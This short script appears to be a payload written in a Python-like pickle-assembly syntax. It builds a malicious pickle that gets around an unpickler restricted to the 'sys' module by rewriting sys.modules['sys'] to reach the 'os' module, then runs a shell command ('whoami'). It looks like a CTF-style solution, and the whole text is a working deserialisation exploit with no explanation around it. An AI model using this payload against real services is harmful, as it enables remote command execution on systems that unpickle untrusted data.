modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('whoami')
return